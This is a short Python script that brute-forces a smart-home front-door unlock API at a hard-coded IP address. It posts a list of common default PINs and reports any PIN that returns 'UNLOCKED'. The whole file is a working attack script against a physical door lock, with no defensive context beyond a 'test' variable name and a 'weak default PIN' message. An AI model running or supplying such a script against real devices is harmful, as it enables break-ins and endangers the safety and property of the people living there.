import requests

test_pins = ["1234", "0000", "1111", "9999", "4321", "2580"]
url = "http://98.70.102.40:8080/api/smart-home/front-door/unlock"

for pin in test_pins:
    response = requests.post(url, json={"pin": pin})
    if "UNLOCKED" in response.text:
        print(f"[+] Weak Default PIN Found: {pin}")
        
